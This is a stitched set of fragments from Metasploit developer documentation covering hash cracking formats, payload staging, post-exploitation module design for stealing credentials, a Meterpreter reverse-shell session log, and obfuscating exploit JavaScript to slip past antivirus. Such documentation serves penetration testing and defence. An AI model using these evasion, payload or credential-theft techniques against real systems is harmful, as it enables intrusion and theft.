While Metasploit standardizes with the JtR format, the hashcat library includes the jtr_format_to_hashcat_format function to translate from jtr to hashcat. Cracker Modes . Each crack mode is a set of rules which apply to that specific mode. The idea being any optimizations can be applied to that mode, and reset on other modes. These modes include: . | Incremental | Wordlist | Pin (mobile devices - hashcat specific) | Normal (jtr specific) | Single (jtr specific) | . Hashcat Optimized Kernel . Hashcat contains a -O flag which uses an optimized kernel. From internal testing it looks to be &gt;200% faster, with a password length tradeoff. For more information see https://github.com/rapid7/metasploit-framework/pull/12790 . Exporting Passwords and Hashes . Hashes can be exported to three different file formats by using the creds command and specifying an output file with the -o option. When the file ends in .jtr or .hcat the John the Ripper or Hashcat formats will be used respectively. Any other file suffix will result in the data being exported in a CSV format. Warning: When exporting in either the John the Ripper or Hashcat formats, any hashes that can not be handled by the formatter will be omitted. See the Adding a New Hash section for details on updating the formatters. Exported hashes can be filtered by a few fields like the username, and realm. One additional useful field is the hash type which can be specified with the -t/--type option. The type can be password, ntlm, hash or any of the John the Ripper format names such as netntlmv2. Example to export all NetNTLMv2 secrets for the WORKGROUP realm for use with John the Ripper: creds --realm WORKGROUP --type netntlmv2 -o /path/to/netntlmv2_hashes.jtr . ",

For example des_password, the password for the hash is password: . # nix creds add user:des_password hash:rEK1ecacw.7.c jtr:des creds add user:md5_password hash:$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/ jtr:md5 creds add user:bsdi_password hash:_J9..K0AyUubDrfOgO4s jtr:bsdi creds add user:sha256_password hash:$5$MnfsQ4iN$ZMTppKN16y/tIsUYs/obHlhdP.Os80yXhTurpBMUbA5 jtr:sha256,crypt creds add user:sha512_password hash:$6$zWwwXKNj$gLAOoZCjcr8p/.VgV/FkGC3NX7BsXys3KHYePfuIGMNjY83dVxugPYlxVg/evpcVEJLT/rSwZcDMlVVf/bhf.1 jtr:sha512,crypt creds add user:blowfish_password hash:$2a$05$bvIG6Nmid91Mu9RcmmWZfO5HJIMCT8riNW0hEp8f6/FuA2/mHZFpe jtr:bf # windows creds add user:lm_password ntlm:E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C jtr:lm creds add user:nt_password ntlm:AAD3B435B51404EEAAD3B435B51404EE:8846F7EAEE8FB117AD06BDD830B7586C jtr:nt creds add user:u4-netntlm hash:u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c jtr:netntlm creds add user:admin hash:admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 jtr:netntlmv2 creds add user:mscash-test1 hash:M$test1#64cd29e36a8431a2b111378564a10631 jtr:mscash creds add user:mscash2-hashcat hash:$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f jtr:mscash2 # sql creds add user:mssql05_toto hash:0x01004086CEB6BF932BC4151A1AF1F13CD17301D70816A8886908 jtr:mssql05 creds add user:mssql_foo hash:0x0100A607BA7C54A24D17B565C59F1743776A10250F581D482DA8B6D6261460D3F53B279CC6913CE747006A2E3254 jtr:mssql creds add user:mssql12_Password1!

    "doc": "How payloads work",
    "title": "How Payloads Work",
    "content": "Payload modules are stored in modules/payloads/{singles,stages,stagers}/&lt;platform&gt;. When the framework starts up, stages are combined with stagers to create a complete payload that you can use in exploits. Then, handlers are paired with payloads so the framework will know how to create sessions with a given communications mechanism. Payloads are given reference names that indicate all the pieces, like so: . | Staged payloads: &lt;platform&gt;/[arch]/&lt;stage&gt;/&lt;stager&gt; | Single payloads: &lt;platform&gt;/[arch]/&lt;single&gt; | . This results in payloads like windows/x64/meterpreter/reverse_tcp. Breaking that down, the platform is windows, the architecture is x64, the final stage we’re delivering is meterpreter, and the stager delivering it is reverse_tcp. Note that architecture is optional because in some cases it is either unnecessary or implied. An example is php/meterpreter/reverse_tcp. Arch is unneeded for PHP payloads because we’re delivering interpreted code rather than native. Singles . Single payloads are fire-and-forget. They can create a communications mechanism with Metasploit, but they don’t have to. An example of a scenario where you might want a single is when the target has no network access – a fileformat exploit delivered via USB key is still possible. Stagers . Stagers are a small stub designed to create some form of communication and then pass execution to the next stage. Using a stager solves two problems. First, it allows us to use a small payload initially to load up a larger payload with more functionality. Second, it makes it possible to separate the communications mechanism from the final stage so one payload can be used with multiple transports without duplicating code. Stages . Since the stager will have taken care of dealing with any size restrictions by allocating a big chunk of memory for us to run in, stages can be arbitrarily large. One advantage of that is the ability to write final-stage payloads in a higher-level language like C. ",

    "content": "Update: We have automated this process (it runs every Thursday at noon US Central Time), and 99.9% of the time you will not need to follow any of the below steps. That said, if you need to update a gem in a PR, this is still a good procedure to follow. Sometimes you might want to pull in a new Ruby library or update an existing one to get more functionality. Metasploit leverages Bundler to manage Ruby gems and make dependencies easy. This document goes over the things you need to know when updating or adding gems to Metasploit. The Gemfile . Gems that are only sometimes used (say, only in test mode, or only when running with a database) are listed in a relevant Bundler group (test or db respectively) in the root Gemfile. The metasploit-framework.gemspec file . Gems that are always needed by Metasploit are kept in the metasploit-framework.gemspec file (this file is actually pulled into the Gemfile when calculating dependencies). The Lock File . The Gemfile.lock file holds the absolute versions of the Gems we want and keeps track of all the subdependencies. You should never need to manually edit this file: bundler will do it for you when you run bundle install after adding a gem. We keep this committed in the repo to ensure that all users are always on the same gem versions. Updating or adding a gem . If the gem is needed only for a specific Bundler group (like test or db), you should update the Gemfile: . | Add the Gem you want to the correct Group, or just update the version constraint. Check Bundler’s docs for the various ways to express version constraints: . gem 'my_favorite', '~&gt; 1.0' . | Run bundle install | Commit any changes to the Gemfile.lock file | . If the gem is needed any time metasploit-framework is used, you should update the metasploit-framework.gemspec file: . | Add the gem as a runtime dependency, or just update the version constraint.

A Gemfile.local file is useful for adding temporary gems to the metasploit-framework, like pry-stack-explorer or other handy debugging libs; you don’t want to commit these gems into the repo, but might need them from time to time.

This method can be overridden by any modules to add their own cleanup routines. For example, this might be useful to put some files back on the target after the module had deleted them. Another scenario would be to restore the settings in a web application that were modified by the exploit. This is the right place to clean things up. Framework itself implements this method to disconnect connections, call the handler cleanup routines, etc. Some other mixins, such as the Msf::Exploit::FileDropper (see the next section) or Msf::Exploit::Remote::Kerberos::Client, override this method to add their own cleanup code. It is extremely important to always call super in your cleanup method to make sure Framework and any other mixins clean up themself properly. Here is an example that restores a configuration file after being deleted by the module: . def cleanup unless self.conf_content.nil? write_file(self.conf_file, self.conf_content) end super end . Here is another example of a cleanup method that deletes a temporary Git repository: . def cleanup super return unless need_cleanup? print_status('Cleaning up') uri = normalize_uri(datastore['USERNAME'], self.repo_name, '/settings') csrf = get_csrf(uri) res = send_request_cgi({ 'method' =&gt; 'POST', 'uri' =&gt; normalize_uri(datastore['TARGETURI'], uri), 'ctype' =&gt; 'application/x-www-form-urlencoded', 'vars_post' =&gt; { _csrf: csrf, action: 'delete', repo_name: self.repo_name } }) unless res fail_with(Failure::Unreachable, 'Unable to reach the settings page') end unless res.code == 302 fail_with(Failure::UnexpectedReply, 'Delete repository failure') end print_status(\"Repository #{self.repo_name} deleted.\") nil end .

    "content": "In some exploitation scenarios such as local privilege escalation, command execution, write privilege attacks, SQL Injections, etc, it is very likely that you have to upload one or more malicious files in order to gain control of the target machine. Well, a smart attacker shouldn’t leave anything behind, so if a module needs to drop something onto the file system, it’s important to remove it right after the purpose is served. And that is why we created the FileDropper mixin. The FileDropper mixin is a file manager that allows you to keep track of files, and then delete them when a session is created. To use it, first include the mixin: . include Msf::Exploit::FileDropper . Next, tell the FileDropper mixin where the file is going to be after a session is created by using the register_file_for_cleanup method. Each file name should either be a full path or relative to the current working directory of the session. For example, if I want to upload a payload to the target machine’s remote path: C:\\Windows\\System32\\payload.exe, then my statement can be: . register_file_for_cleanup(\"C:\\\\Windows\\\\System32\\\\payload.exe\") . If my session’s current directory is already in C:\\Windows\\System32\\, then you can: . register_file_for_cleanup(\"payload.exe\") . If you wish to register multiple files, you can also provide the file names as arguments: . register_file_for_cleanup(\"file_1.vbs\", \"file_2.exe\", \"file_1.conf\") . Note that if your exploit module uses on_new_session, you are actually overriding FileDropper’s on_new_session. ",

This was also how Metasploit handled name lookups and would only directly communicate with a DNS server when the request was more involved than mapping a hostname to an IPv4 or IPv6 address. One flaw in this approach is that when pivoting connections over a session, the DNS lookups would occur through the host on which Metasploit was running instead of the compromised host from which the connection would originate. This lead to two issues, the first being the aforementioned DNS leaks and the second that Metasploit could not always resolve hostnames that the compromised system could. Starting in Metasploit 6.4, Metasploit uses an internal DNS resolution system that grants the user a high degree of control over the process of DNS queries. ",

    "content": "DNS resolver rules are a single wildcard that is associated with zero or more resolver types. When a query name matches the wildcard expression, the associated resolvers are used in succession until one is capable of fulfilling the request. For example, a wildcard pattern of *.lab.lan would match www.lab.lan and _ldap._tcp.lab.lan, but not lab.lan or msflab.lan. Furthermore, the * wildcard pattern matches everything and should be used as a default rule. Once a rule that matches the query name is found, the specified resolvers will be tried in order until one is capable of handling the request. Different resolver types can be specified to handle queries in different ways. Rules are listed in numeric order starting at position 1. Rules can be added to or removed from specific positions in a similar manner to how iptables rules can be added to and removed from a specific chain. The Black Hole Resolver . The black hole resolver can be used to prevent queries from being resolved. It handles all query types and will prevent resolvers defined after it from being used. The black hole resolver is specified by using the black-hole keyword. The Upstream Resolver . An upstream resolver can be used by specifying either an IPv4 or IPv6 address. When Metasploit uses this resolver, the defined host will be contacted over the network. A session can optionally be defined through which network traffic will be sent. The System Resolver . The system resolver can be used for hostname resolution to either IPv4 or IPv6 addresses by invoking the host operating system’s API. This is particularly useful in cases where the system’s API is expected to be hooked by an external entity such as proxychains. The system resolver is specified by using the system keyword. Queries that can not be fulfilled by simply translating the query name to an IP address (e.g. PTR, TXT and SRV queries) will use the next resolver that is configured in the rule. The Static Resolver . The static resolver can be used for hostname resolution to either IPv4 or IPv6 addresses through a static mapping that is configured within Metasploit. This functionality is analogous to the hosts file found on many systems which defines static hostname to IP address associations. The static resolver is specified by using the static keyword. Queries that can not be fulfilled by simply translating the query name to an IP address (e.g. PTR, TXT and SRV queries) will use the next resolver that is configured in the rule.

Append a rule to the end that will handle all queries for *.lab.lan using an upstream server contacted through session 1. dns add --rule *.lab.lan --session 1 192.0.2.1 .

    "content": ". | store_loot() - Used to store both stolen files (both text and binary) and “screencaps” of commands such as a ps -ef and ifconfig. The file itself need not be of forensic-level integrity – they may be parsed by a post module to extract only the relevant information for a penetration tester. | report_auth_info() - Used to store working credentials that are immediately reusable by another module. For example, a module dumping the local SMB hashes would use this, as would a module which reads username:password combinations for a specific host and service. Specifically, merely “likely” usernames and passwords should use store_loot() instead. | report_vuln() - Auxiliary and post modules that exercise a particular vulnerability should report_vuln() upon success. Note that exploit modules automatically report_vuln() as part of opening a session (there is no need to call it especially). | report_note() - Modules should make an effort to avoid report_note() when one of the above methods would be a better fit, but there are often cases where “loot” or “cred” or “vuln” classifications are not immediately appropriate. report_note() calls should always set a OID-style dotted :type, such as domain.hosts, so other modules may easily find them in the database. | report_host() - Reports a host’s liveness and attributes such as operating system and service pack. This is less common because other reporting methods already do this, such as report_service, report_exploit_success, report_client, report_note, report_host_tag, report_vuln, report_event, report_loot, etc. Try not to repeat it. | report_service() - Reports a new service (port) that’s been detected by your module. | report_client() - Reports a client running a host, such as a web browser. | report_web_site() - Reports a website, and must be tied to an existing :service. If there is no :service, you will have to supply :host, :port, :ssl. | report_web_page() - You can use this if your module discovers a webpage that look interesting. | report_web_form() - You can use this if your module discovers web forms that look interesting. | report_web_vuln() - Reports a web application vulnerability. Exploits don’t really need to use this. It’s more suitable for auxiliary modules that exploit a bug that determines that it is vulnerable. | report_loot() - Very rarely, modules might actually want to export loots without using store_loot(). Typically they do this with Ruby’s file IO, but this won’t be logged in the database so can’t be tracked by Metasploit Framework. In that case, a report_loot() is needed. However, 99.9% of the time you should be using store_loot(). | .

    "title": "Plan your module",
    "content": "Just like writing a software, before you start coding you should have a clear and specific goal for what your post module does. It’s never a good idea to have multiple functionalities in a single module. For example: having it steal the network configuration files, steal passwd, hashes, shell history, etc. Instead, you should break it down into multiple modules. You should also think about what session types to support: meterpreter, or shell. Ideally, support both. But if you have to choose between the two, on Windows you should favor Windows Meterpreter. On Linux, the shell session type has been a stronger candidate than the Linux Meterpreter, but hopefully this will change in the near future. For platforms that don’t have a Meterpreter, obviously your only choice is a shell. Another important thing is to think about how your module will perform on different distributions/systems. For example, say you want to run a ifconfig command on Linux. On Ubuntu it’s a no-brainer, simply run the ifconfig command. Well, a different Linux distro might not actually know what you’re asking, so you have to be more specific and do /sbin/ifconfig instead. Same thing with Windows. Is it C:\\WINDOWS\\ or C:\\WinNT? It’s both. Is it C:\\Documents and Settings\\[User name], or C:\\Users\\[User name]? Both, depends on that Windows version. A better solution to that would be use an environment variable :-) . Always do your homework, and contain as many scenarios you can think of. And most importantly, get your VMs and TEST! . Categories of post modules . Post modules are categorized based on their behavior. For example, if it collects data, naturally it goes to the “gather” category. If it adds/updates/or removes an user, it belongs to “manage”. Here’s a list as a reference: . | Category | Description | . | gather | Modules that involve data gathering/collecting/enumeration. | . | gather/credentials | Modules that steal credentials. | . | gather/forensics | Modules that involve forensics data gathering. | . | manage | Modules that modifies/operates/manipulates something on the system. Session management related tasks such as migration, injection also go here. | . | recon | Modules that will help you learn more about the system in terms of reconnaissance, but not about data stealing. Understand this is not the same as “gather” type modules. | . | wlan | Modules that are for WLAN related tasks. | . | escalate | This is deprecated, but the modules remain there due to popularity. This used to be the place for privilege escalation modules. All privilege escalation modules are no longer considered as post modules, they’re now exploits. | . | capture | Modules that involve monitoring something for data collection. For example: key logging. | . Session object . So you know how in Lord of the Rings, people are totally obsessed with the One Ring? Well, that’s how it is with the session object. The one object you cannot live without, it’s your precious. All post modules and other related mixins basically are built on top of the session object, because it knows everything about the compromised host, and allows you to command it. You can use the session method to access the session object, or its alias client. The best way to interact with one is via irb, here’s an example of how: . msf exploit(handler) &gt; run [*] Started reverse handler on 192.168.1.64:4444 [*] Starting the payload handler... [*] Sending stage (769536 bytes) to 192.168.1.106 [*] Meterpreter session 1 opened (192.168.1.64:4444 -&gt; 192.168.1.106:55157) at 2014-07-31 17:59:36 -0500 meterpreter &gt; irb [*] Starting IRB shell [*] The 'client' variable holds the meterpreter client &gt;&gt; session.class =&gt; Msf::Sessions::Meterpreter_x86_Win . At this point you have the power to rule them all. But notice that the above example is a Msf::Sessions::Meterpreter_x86_Win object. There are actually several more different ones: command_shell.rb, meterpreter_php.rb, meterpreter_java.rb, meterpreter_x86_linux.rb, etc. Each behaves differently so it’s actually kind of difficult to explain them all, but they are defined in the lib/msf/base/sessions/ directory so you can see how they work. Or you can play with one since you’re already in the irb prompt. In Ruby, there are two object methods that are handy for debugging purposes. The first is methods, which will list all the public and protected methods from that object: . session.methods . The other one is inspect, which returns a string of a human-readable representation of the object: . session.inspect . One commonly used method of the session object is the platform method. For example, if you’re writing a post module for a windows exploit, in the check method you’ll likely want to use session.platform to ensure the target session is affected: . unless session.platform == 'windows' # Non-Windows systems are definitely not affected. return Exploit::CheckCode::Safe end . You can also look at other current post modules and see how they use their session object. The Msf::Post Mixin . As we explained, most post module mixins are built on top of the session object, and there are many out there. However, there is a main one you obviously cannot live without: the Msf::Post mixin. When you create a post module with this mixin, a lot of other mixins are also already included for all kinds of scenarios, to be more specific: . | msf/core/post/common - Common methods post modules use, for example: cmd_exec. | msf/core/post_mixin - Keeps track of the session state. | msf/core/post/file - File system related methods. | msf/core/post/webrtc - Uses WebRTC to interact with the target machine’s webcam. | msf/core/post/linux - There actually isn’t a lot going on, just get_sysinfo and is_root? specifically for Linux. | msf/core/post/osx - get_sysinfo, get_users, get_system_accounts, get_groups, and methods for operating the target machine’s webcam. | msf/core/post/solaris - Pretty much like the linux mixin. Same methods, but for Solaris. | msf/core/post/unix - get_users, get_groups, enum_user_directories | msf/core/post/windows - Most of the development time are spent here. From Windows account management, event log, file info, Railgun, LDAP, netapi, powershell, registry, wmic, services, etc. | . Template . Here we have a post module template. As you can see, there are some required fields that need to be filled. We’ll explain each: . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Post def initialize(info = {}) super( update_info( info, 'Name' =&gt; '[Platform] [Module Category] [Software] [Function]', 'Description' =&gt; %q{ Say something that the user might want to know. }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'Name' ], 'Platform' =&gt; [ 'win', 'linux', 'osx', 'unix', 'bsd', 'solaris' ], 'SessionTypes' =&gt; [ 'meterpreter', 'shell' ] ) ) end def run # Main method end end . The Name field should begin with a platform, such as: Multi, Windows, Linux, OS X, etc. Followed by the module’s category, such as: Gather, Manage, Recon, Capture, Wlan. Followed by the name of the software, and then finally a few words that describe the functionality of the module. A naming example: “Multi Gather RndFTP Credential Enumeration”. The Description field should explain what the module does, things to watch out for, specific requirements, the more the better. The goal is to let the user understand what he’s using without the need to actually read the module’s source and figure things out. And trust me, most of them don’t. The Author field is where you put your name. The format should be “Name \". If you want to have your Twitter handle there, leave it as a comment, for example: \"Name # handle\" . The Platform field indicates what platforms are supported, for example: win, linux, osx, unix, bsd. The SessionTypes field should be either meterpreter, or shell. You should try to support both. And finally, the run method is like your main method. Start writing your code there. Basic git commands . Metasploit no longer uses svn for source code management, instead we use git, so knowing some tricks with git go a long way. We’re not here to lecture you about how awesome git is, we know it has a learning curve and it’s not surprising to find new users making mistakes. Every once a while, your git “rage” will kick in, and we understand. However, it’s important for you to take advantage of branching. Every time you make a module, or make some changes to existing code, you should not do so on the default master branch. Why? Because when you do a msfupdate, which is Metasploit’s utility for updating your repository, it will do a git reset before merging the changes, and all your code go bye-bye. Another mistake people tend to do is have all the changes on master before submitting a pull request. This is a bad idea, because most likely you’re submitting other crap you don’t intend to change, and/or you’re probably asking us to merge other unnecessary commit history when there only needs to be one commit. Thanks for contributing your module to the community, but no thanks to your crazy commit history. So as a habit, when you want to make something new, or change something, begin with a new branch that’s up to date to master. First off, make sure you’re on master. If you do a git status it will tell you what branch you’re currently on: . $ git status # On branch upstream-master nothing to commit, working directory clean . Ok, now do a git pull to download the latest changes from Metasploit: . $ git pull Already up-to-date. At this point, you’re ready to start a new branch. In this case, we’ll name our new branch “my_awesome_branch”: . $ git checkout -b my_awesome_module Switched to a new branch 'my_awesome_module' . And then you can go ahead and add that module. Make sure it’s in the appropriate path: . $ git add [module path] . When you decide to save the changes, commit (if there’s only one module, you can do git commit -a too so you don’t have to type the module path. Note -a really means EVERYTHING): . $ git commit [module path] . When you’re done, push your changes, which will upload your code to your remote branch “my_awesome_branch”. You must push your changes in order to submit the pull request, or share it with others on the Internet. $ git push origin my_awesome_branch .

Will it error out and leave a backtrace? If it does, you should handle that properly. Does your module require specific settings/conditions from the target machine? What happens if it doesn’t?

There’s a new “THREADS” option, which allows the number of threads to run during execution. There’s also “ShowProgress” and “ShowProgressPercent” for tracking scan progress.

Another interesting fact about auxiliary modules is that some of them aren’t so different from being exploits. The main difference is how it’s defined in Metasploit: if a module executes a payload, it’s an exploit. If not, even though it takes advantage of a vulnerability, it still belongs to the auxiliary category. If an auxiliary module is capable of running an Operating System command, it could be made into an exploit by delivering a cmd* payload and/or using a command stager.

    "content": "The ObfuscateJS class is like the rand_text_alpha technique on steroids, but even better. It allows you to replace symbol names such as variables, methods, classes, and namespaces. It can also obfuscate strings by either randomly using fromCharCode or unescape. And lastly, it can strip JavaScript comments, which is handy because exploits often are hard to understand and read so you need comments to remember why something is written in a specific way, but you don’t want to show or leak those comments in a pentest. To use ObfuscateJS, let’s use the MS12-063 example again to demonstrate. If you feel like following the steps yourself without writing a module, what you can do is go ahead and run msfconsole, and then switch to irb, like this: . $ ./msfconsole -q msf &gt; irb [*] Starting IRB shell... &gt;&gt; . And then you are ready to go. The first thing you do with ObfuscateJS is you need to initialize it with the JavaScript you want to obfuscate, so in this case, begin like the following: . js = %Q| var arrr = new Array(); arrr[0] = windows.document.createElement(\"img\"); arrr[0][\"src\"] = \"a\"; | obfu = ::Rex::Exploitation::ObfuscateJS.new(js) . obfu should return a Rex::Exploitation::ObfuscateJS object. It allows you to do a lot of things, you can really just call methods, or look at the source to see what methods are available (with additional API documentation). But for demo purposes, we’ll showcase the most common one: the obfuscate method. To actually obfuscate, you need to call the obfuscate method. This method accepts a symbols argument that allows you to manually specify what symbol names (variables, methods, classes, etc) to obfuscate, it should be in a hash like this: . { 'Variables' =&gt; [ 'var1', ... ], 'Methods' =&gt; [ 'method1', ... ], 'Namespaces' =&gt; [ 'n', ... ], 'Classes' =&gt; [ { 'Namespace' =&gt; 'n', 'Class' =&gt; 'y'}, ... ] } . So if I want to obfuscate the variable arrr, and I want to obfuscate the src string, here’s how: . &gt;&gt; obfu.obfuscate('Symbols' =&gt; {'Variables'=&gt;['arrr']}, 'Strings' =&gt; true) =&gt; \"\\nvar QqLFS = new Array();\\nQqLFS[0] = windows.document.createElement(unescape(String.fromCharCode( 37, 54, 071, 045, 0x36, 0144, 37, 066, 067 )));\\nQqLFS[0][String.fromCharCode( 115, 0x72, 0143 )] = unescape(String.fromCharCode( 045, 0x36, 0x31 ));\\n\" . In some cases, you might actually want to know the obfuscated version of a symbol name. One scenario is calling a JavaScript function from an element’s event handler, such as this: . &lt;html&gt; &lt;head&gt; &lt;script&gt; function test() { alert(\"hello, world!\"); } &lt;/script&gt; &lt;/head&gt; &lt;body onload=\"test();\"&gt; &lt;/body&gt; &lt;/html&gt; . The obfuscated version would look like the following: . js = %Q| function test() { alert(\"hello, world!\"); } | obfu = ::Rex::Exploitation::ObfuscateJS.new(js) obfu.obfuscate('Symbols' =&gt; {'Methods'=&gt;['test']}, 'Strings' =&gt; true) html = %Q| &lt;html&gt; &lt;head&gt; &lt;script&gt; #{js} &lt;/script&gt; &lt;/head&gt; &lt;body onload=\"#{obfu.sym('test')}();\"&gt; &lt;/body&gt; &lt;/html&gt; | puts html .

    "title": "The JSObfu class",
    "content": "The JSObfu class used to be ObfuscateJS’ cousin, but it has been completely rewritten since September 2014, and packaged as a gem. The obfuscation is more complex and you can actually tell it to obfuscate multiple times. You also no longer have to manually specify what symbol names to change, it just knows. Trying JSObfu in Rex . Let’s get back to irb again to demonstrate how easy it is to use JSObfu: . $ ./msfconsole -q msf &gt; irb [*] Starting IRB shell... &gt;&gt; . This time we’ll do a “hello world” example: . &gt;&gt; js = ::Rex::Exploitation::JSObfu.new %Q|alert('hello, world!');| =&gt; alert('hello, world!'); &gt;&gt; js.obfuscate =&gt; nil . And here’s the output: . window[(function () { var _d=\"t\",y=\"ler\",N=\"a\"; return N+y+_d })()]((function () { var f='d!',B='orl',Q2='h',m='ello, w'; return Q2+m+B+f })()); . Like ObfuscateJS, if you need to get the randomized version of a symbol name, you can still do that. We’ll demonstrate this with the following example: . &gt;&gt; js = ::Rex::Exploitation::JSObfu.new %Q|function test() { alert(\"hello\"); }| =&gt; function test() { alert(\"hello\"); } &gt;&gt; js.obfuscate . Say we want to know the randomized version of the method name “test”: . &gt;&gt; puts js.sym(\"test\") _ . OK, double check right quick: . &gt;&gt; puts js function _(){window[(function () { var N=\"t\",r=\"r\",i=\"ale\"; return i+r+N })()](String.fromCharCode(0150,0x65,0154,0x6c,0x6f));} . Yup, that looks good to me. And finally, let’s try to obfuscate a few times to see how that goes: . &gt;&gt; js = ::Rex::Exploitation::JSObfu.new %Q|alert('hello, world!');| =&gt; alert('hello, world!'); &gt;&gt; js.obfuscate(:iterations=&gt;3) =&gt; window[String[((function(){var s=(function () { var r=\"e\"; return r })(),Q=(function () { var I=\"d\",dG=\"o\"; return dG+I })(),c=String.fromCharCode(0x66,114),w=(function () { var i=\"C\",v=\"r\",f=\"omCh\",j=\"a\"; return f+j+v+i })();return c+w+Q+s;})())](('Urx'.length*((0x1*(01*(1*020+5)+1)+3)*'u'.length+('SGgdrAJ'.length-7))+(('Iac'.length*'XLR'.length+2)*'qm'.length+0)),(('l'.length*((function () { var vZ='k'; return vZ })()[((function () { var E=\"h\",t=\"t\",O=\"leng\"; return O+t+E })())]*(0x12*1+0)+'xE'.length)+'h'.length)*(function () { var Z='uA',J='tR',D='x'; return D+J+Z })()[((function () { var m=\"th\",o=\"g\",U=\"l\",Y=\"en\"; return U+Y+o+m })())]+'lLc'.length),('mQ'.length*(02*023+2)+('Tt'.length*'OEzGiMVf'.length+5)),(String.fromCharCode(0x48,0131)[((function () { var i=\"gth\",r=\"len\"; return r+i })())]*('E'.length*0x21+19)+(0x1*'XlhgGJ'.length+4)),(String.fromCharCode(0x69)[((function () { var L=\"th\",Q=\"n\",$=\"l\",I=\"g\",x=\"e\"; return $+x+Q+I+L })())]*('QC'.length*0x2b+3)+(01*26+1)))]((function(){var C=String[((function () { var w=\"rCode\",j=\"mCha\",A=\"fr\",B=\"o\"; return A+B+j+w })())]((6*0x10+15),('riHey'.length*('NHnex'.length*0x4+2)+4),(01*95+13),(1*('Z'.length*(0x1*(01*(0x3*6+5)+1)+18)+12)+46),(0x1*(01*013+6)+16)),JQ=String[((function () { var NO=\"ode\",T=\"rC\",HT=\"fromCha\"; return HT+T+NO })())](('J'.length*0x54+17),(0x2*051+26),('TFJAGR'.length*('ymYaSJtR'.length*'gv'.length+0)+12),(01*0155+2),(0xe*'FBc'.length+2),(0x1*22+10),(3*(01*043+1)+11)),g=(function(){var N=(function () { var s='h'; return s })();return N;})();return g+JQ+C;})()); . Using JSObfu for module development . When you are writing a module, you should not call Rex directly like the above examples. Instead, you should be using the #js_obfuscate method found in JSObfu mixin. When you’re using JavaScript in your module, always do write it like this: . # This returns a Rex::Exploitation::JSObfu object js = js_obfuscate(your_code) . Note that by default, even though your module is calling the #js_obfuscate method, obfuscation will not kick in unless the user sets the JsObfuscate datastore option. This option is an OptInt, which allows you to set the number of times to obfuscate (default is 0). ",

If your exploit gets caught all the time, it doesn’t matter how awesome or how technically challenging your exploit is, it is most likely not very usable in a real penetration test. Browser exploits in particular, heavily rely on JavaScript to trigger vulnerabilities, therefore a lot of antivirus or signature-based intrusion detection/prevention systems will scan the JavaScript and flag specific lines as malicious. The following code used to be considered as MS12-063 by multiple antivirus vendors even though it is not necessarily harmful or malicious, we’ll use this as an example throughout the wiki: . var arrr = new Array(); arrr[0] = windows.document.createElement(\"img\"); arrr[0][\"src\"] = \"a\"; . To avoid getting flagged, there are some common evasive tricks we can try. For example, you can manually modify the code a little bit to make it not recognizable by any signatures. Or if the antivirus relies on cached webpages to scan for exploits, it is possible to make the browser not cache your exploit so you stay undetected. Or in this case, you can obfuscate your code, which is what this writeup will focus on. In Metasploit, there are three common ways to obfuscate your JavaScript. The first one is simply by using the rand_text_alpha method (in Rex) to randomize your variables. The second one is by using the ObfuscateJS class. And the third option is the JSObfu class. ",

    "content": "When you have a Rex::Proto::Http::Response with HTML in it, the method to call is: . html = res.get_html_document . This will give you a Nokogiri::HTML::Document, which allows you use the Nokogiri API. There are two common methods in Nokogiri to find elements: #at and #search. The main difference is that the #at method will only return the first result, while the #search will return all found results (in an array). Consider the following example as your HTML response: . &lt;html&gt; &lt;head&gt; &lt;title&gt;Hello, World!&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"greetings\"&gt; &lt;div id=\"english\"&gt;Hello&lt;/div&gt; &lt;div id=\"spanish\"&gt;Hola&lt;/div&gt; &lt;div id=\"french\"&gt;Bonjour&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;html&gt; . Basic usage of #at . If the #at method is used to find a DIV element: . html = res.get_html_document greeting = html.at('div') . Then the greeting variable should be a Nokogiri::XML::Element object that gives us this block of HTML (again, because the #at method only returns the first result): . &lt;div class=\"greetings\"&gt; &lt;div id=\"english\"&gt;Hello&lt;/div&gt; &lt;div id=\"spanish\"&gt;Hola&lt;/div&gt; &lt;div id=\"french\"&gt;Bonjour&lt;/div&gt; &lt;/div&gt; . Grabbing an element from a specific element tree . html = res.get_html_document greeting = html.at('div//div') . Then the greeting variable should give us this block of HTML: . &lt;div id=\"english\"&gt;Hello&lt;/div&gt; . Grabbing an element with a specific attribute . Let’s say I don’t want the English Hello, I want the Spanish one. Then we can do: . html = res.get_html_document greeting = html.at('div[@id=\"spanish\"]') . Grabbing an element with a specific text . Let’s say I only know there’s a DIV element that says “Bonjour”, and I want to grab it, then I can do: . html = res.get_html_document greeting = html.at('//div[contains(text(), \"Bonjour\")]') . Or let’s say I don’t know what element the word “Bonjour” is in, then I can be a little vague about this: . html = res.get_html_document greeting = html.at('[text()*=\"Bonjour\"]') . Basic usage of #search . The #search method returns an array of elements. Let’s say we want to find all the DIV elements, then here’s how: . html = res.get_html_document divs = html.search('div') . Accessing text . When you have an element, you can always call the #text method to grab the text. For example: . html = res.get_html_document greeting = html.at('[text()*=\"Bonjour\"]') print_status(greeting.text) . The #text method can also be used as a trick to strip all the HTML tags: . html = res.get_html_document print_line(html.text) . The above will print: . \"\\n\\nHello, World!\\n\\n\\n\\nHello\\nHola\\nBonjour\\n\\n\\n\" . If you actually want to keep the HTML tags, then instead of calling #text, call #inner_html. Accessing attributes . With an element, simply call #attributes. Walking a DOM tree . Use the #next method to move on to the next element. Use the #previous method to roll back to the previous element. Use the #parent method to find the parent element. Use the #children method to get all the child elements. Use the #traverse method for complex parsing. ",

    "title": "Cookies &amp; CookieJars",
